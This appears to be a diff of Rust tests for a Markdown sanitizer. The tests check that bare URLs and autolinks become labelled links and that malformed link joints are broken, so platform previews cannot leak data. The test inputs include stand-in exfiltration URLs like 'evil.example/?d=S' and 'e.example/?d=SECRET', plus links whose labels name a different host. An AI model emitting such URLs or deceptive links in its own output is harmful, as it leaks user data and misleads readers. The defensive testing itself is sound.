@@ -68,11 +68,15 @@ fn link_schemes_other_than_http_https_mailto_become_text() {
         "[a](https://x.example/p?q=1)",
         "[a](http://x.example)",
         "[a](mailto:a@x.example)",
-        "<https://x.example>",
         "<a@x.example>",
     ] {
         assert_eq!(md(ok), ok, "{ok}");
     }
+    // D-270: an autolink is a labelled link (a platform's preview fetches `<url>` unprompted).
+    assert_eq!(
+        md("<https://x.example>"),
+        "[https://x.example](https://x.example)"
+    );
 }
 
 #[test]
@@ -95,7 +99,6 @@ fn a_label_that_claims_another_host_gets_the_real_one() {
         "[cern.ch](https://www.cern.ch/a)",
         "[https://cern.ch/a](https://cern.ch/b)",
         "[see this page.](https://x.example)",
-        "<https://cern.ch>",
     ] {
         assert_eq!(md(ok), ok, "{ok}");
     }
@@ -220,6 +223,19 @@ fn explain(src: &str) -> &'static str {
             Event::Text(_) if src[r.clone()].contains("![") => {
                 found = "1 image opener in text";
             }
+            // D-270: a bare URL or an autolink becomes a labelled link.
+            Event::Start(Tag::Link {
+                link_type: LinkType::Autolink,
+                ..
+            }) => found = "5 bare url",
+            Event::Text(_) => {
+                let l = src[r.clone()].to_ascii_lowercase();
+                if l.contains("http://") || l.contains("https://") {
+                    found = "5 bare url";
+                } else if src[r.clone()].contains("](") || src[r.clone()].contains("]:") {
+                    found = "6 link joint";
+                }
+            }
             Event::Start(Tag::HtmlBlock) | Event::InlineHtml(_)
                 if sanitize_html(&src[r.clone()]) != src[r.clone()] =>
             {
@@ -342,6 +358,14 @@ fn fragments() -> impl Strategy<Value = String> {
         "<div>\n![x](https://e.example/?d=S)\n</div>",
         "!<a href=\"https://e.example/p.png\">x</a>",
         "<code>@here</code>",
+        "https://e.example/?d=SECRET",
+        "see https://e.example/a_b.",
+        "<https://e.example/x>",
+        "<div>https://e.example/?d=S</div>",
+        "<b>https://e.example/b</b>",
+        "[https://cern\\.ch](https://e.example/a b)",
+        "[https://cern&#46;ch][r]",
+        "x\n[r]: https://e.example/\n[x][r]",
         "[https://cern.ch](http:e.example/l)",
         "para\n[r]: https://e.example/\n![x][r]",
         "<",
@@ -466,6 +490,205 @@ fn a_label_cannot_hide_the_destination_host() {
     );
 }
 
+/// The prose runs of `s` (adjacent text events outside code, an escape's backslash bridged), as
+/// the platform reads them: `(raw text, inside a link)`.
+fn prose_runs(s: &str) -> Vec<(String, bool)> {
+    let mut runs: Vec<(String, bool, usize)> = Vec::new();
+    let mut in_code = false;
+    let mut link = 0usize;
+    for (e, r) in Parser::new_ext(s, options()).into_offset_iter() {
+        match e {
+            Event::Start(Tag::CodeBlock(_)) => in_code = true,
+            Event::End(pulldown_cmark::TagEnd::CodeBlock) => in_code = false,
+            Event::Start(Tag::Link { .. }) => link += 1,
+            Event::End(pulldown_cmark::TagEnd::Link) => link = link.saturating_sub(1),
+            Event::Text(_) if !in_code => {
+                let raw = &s[r.clone()];
+                match runs.last_mut() {
+                    Some((t, l, end))
+                        if *l == (link > 0)
+                            && r.start >= *end
+                            && matches!(&s[*end..r.start], "" | "\\") =>
+                    {
+                        t.push_str(&s[*end..r.start]);
+                        t.push_str(raw);
+                        *end = r.end;
+                    }
+                    _ => runs.push((raw.to_owned(), link > 0, r.end)),
+                }
+            }
+            _ => {}
+        }
+    }
+    runs.into_iter().map(|(t, l, _)| (t, l)).collect()
+}
+
+/// A `](` the parser did not form a link from (review 3).
+fn loose_joint(s: &str) -> bool {
+    prose_runs(s).iter().any(|(t, _)| t.contains("]("))
+}
+
+/// A bare `http(s)://` outside code and links (D-270).
+fn bare_url_left(s: &str) -> bool {
+    prose_runs(s).iter().any(|(t, in_link)| {
+        !in_link && {
+            let l = t.to_ascii_lowercase();
+            l.contains("http://") || l.contains("https://")
+        }
+    })
+}
+
+/// A bare URL in the text of raw HTML (outside tags and outside an `<a>`), D-270.
+fn html_bare_url_left(s: &str) -> bool {
+    let mut in_a = false;
+    for (e, _) in Parser::new_ext(s, options()).into_offset_iter() {
+        let (Event::Html(h) | Event::InlineHtml(h)) = e else {
+            continue;
+        };
+        let mut rest: &str = &h;
+        // A `<` starts a tag only when a letter or `/` follows.
+        let tag_at = |s: &str| {
+            s.char_indices().find_map(|(i, c)| {
+                (c == '<' && s[i + 1..].starts_with(|n: char| n.is_ascii_alphabetic() || n == '/'))
+                    .then_some(i)
+            })
+        };
+        while let Some(p) = tag_at(rest) {
+            let text = &rest[..p];
+            let l = text.to_ascii_lowercase();
+            if !in_a && (l.contains("http://") || l.contains("https://")) {
+                return true;
+            }
+            let tail = &rest[p..];
+            let end = tail.find('>').map_or(tail.len(), |e| e + 1);
+            let tag = tail[..end].to_ascii_lowercase();
+            if tag.starts_with("<a ") || tag == "<a>" {
+                in_a = true;
+            } else if tag.starts_with("</a") {
+                in_a = false;
+            }
+            rest = &tail[end..];
+        }
+        let l = rest.to_ascii_lowercase();
+        if !in_a && (l.contains("http://") || l.contains("https://")) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Review 3 (2): a link joint (`](`) or a definition line that pulldown did not form is still a
+/// link on a platform whose dialect is looser (Mattermost 11.7.15: a destination may hold
+/// spaces; a definition may follow a paragraph line). The sanitizer breaks them in prose.
+#[test]
+fn link_joints_and_definition_lines_pulldown_did_not_form_are_broken() {
+    for src in [
+        "[https://cern\\.ch](https://evil.example/a b)",
+        "[https://cern&#46;ch](https://evil.example/a b)",
+        "[https://cern.ch\\]](https://evil.example/a b)",
+        "para\n[r]: https://evil.example/login\n[https://cern&#46;ch][r]",
+        "para\n[cern  ch]: https://evil.example/login\n[https://cern.ch][cern ch]",
+        "para\n   [r]: https://evil.example/login\n[https://cern.ch][r]",
+        "a *b*\n[r]: https://evil.example/\n[x][r]",
+    ] {
+        let out = md(src);
+        assert!(!loose_joint(&out), "{src:?} -> {out:?}");
+        assert!(
+            !out.lines().skip(1).any(|l| {
+                let t = l.trim_start_matches(' ');
+                t.starts_with('[') && t.contains("]:")
+            }),
+            "{src:?} -> {out:?}"
+        );
+        assert_eq!(md(&out), out, "idempotent: {src:?}");
+    }
+    // A real link, a definition at the start of the text and code are untouched.
+    for same in [
+        "[a](https://a.example/x)",
+        "[r]: https://a.example/\n\n[x][r]",
+        "`[a](b)`",
+        "```\n[r]: u\n[a](b c)\n```",
+    ] {
+        assert_eq!(md(same), same, "{same:?}");
+    }
+}
+
+/// D-270 (owner): a bare URL or autolink in prose becomes `[url](url)` — a platform's preview
+/// fetches it unprompted, with no click, so data in its query string leaves.
+#[test]
+fn bare_urls_and_autolinks_become_labelled_links() {
+    for (src, want) in [
+        (
+            "see https://evil.example/?d=S now",
+            "see [https://evil.example/?d=S](https://evil.example/?d=S) now",
+        ),
+        (
+            "https://a.example.",
+            "[https://a.example](https://a.example).",
+        ),
+        (
+            "(https://a.example/x)",
+            "([https://a.example/x](https://a.example/x))",
+        ),
+        (
+            "<https://y.example>",
+            "[https://y.example](https://y.example)",
+        ),
+        (
+            "HTTP://A.EXAMPLE/p",
+            "[HTTP://A.EXAMPLE/p](HTTP://A.EXAMPLE/p)",
+        ),
+        (
+            "go: https://a.example/a_b_c, then",
+            "go: [https://a.example/a_b_c](https://a.example/a_b_c), then",
+        ),
+        (
+            "**https://a.example/b**",
+            "**[https://a.example/b](https://a.example/b)**",
+        ),
+        (
+            "- https://a.example/1\n- https://a.example/2",
+            "- [https://a.example/1](https://a.example/1)\n- [https://a.example/2](https://a.example/2)",
+        ),
+        (
+            "https://en.wikipedia.org/wiki/Rust_(language)",
+            "[https://en.wikipedia.org/wiki/Rust_(language)](<https://en.wikipedia.org/wiki/Rust_(language)>)",
+        ),
+        (
+            "| a | b |\n|---|---|\n| https://a.example | x |",
+            "| a | b |\n|---|---|\n| [https://a.example](https://a.example) | x |",
+        ),
+        (
+            "<https://a.example/?a=1&b=2>",
+            "[https://a.example/?a=1\\&b=2](https://a.example/?a=1&b=2)",
+        ),
+    ] {
+        let out = md(src);
+        assert_eq!(out, want, "{src}");
+        assert!(!bare_url_left(&out), "{src} -> {out}");
+        assert_eq!(md(&out), out, "idempotent: {src}");
+    }
+    // Untouched: code, links already written as links, mail addresses, no scheme, other schemes.
+    for same in [
+        "`https://a.example`",
+        "```\nhttps://a.example/x\n```",
+        "    https://a.example/indented-code",
+        "[x](https://a.example)",
+        "[https://a.example](https://a.example)",
+        "[r]: https://a.example/\n\n[x][r]",
+        "<a@b.example>",
+        "www.example.org and example.org/path",
+        "mailto:a@b.example",
+    ] {
+        assert_eq!(md(same), same, "{same:?}");
+    }
+    // The label of a link may name a URL (that is a link, not a bare one), with rule 2's note.
+    assert_eq!(
+        md("[https://cern.ch](https://evil.example/x)"),
+        "[https://cern.ch](https://evil.example/x) (→ evil.example)"
+    );
+}
+
 #[test]
 fn link_host_lie_names_the_real_host() {
     assert_eq!(
@@ -519,6 +742,9 @@ proptest! {
             }
         }
         prop_assert!(no_live_image_opener(&out), "image opener survived: {out:?}");
+        prop_assert!(!loose_joint(&out), "link joint survived: {out:?}");
+        prop_assert!(!bare_url_left(&out), "bare url survived: {out:?}");
+        prop_assert!(!html_bare_url_left(&out), "bare url in html text survived: {out:?}");
         // A backslash-escaped `\<` (the data fallback) is inert text, not a token.
         prop_assert!(!has_token(&out.replace("\\<", "")), "token formed: {out:?}");
         prop_assert!(out.chars().all(|c| !is_stripped(c) || c == '\u{200B}'), "stripped char: {out:?}");
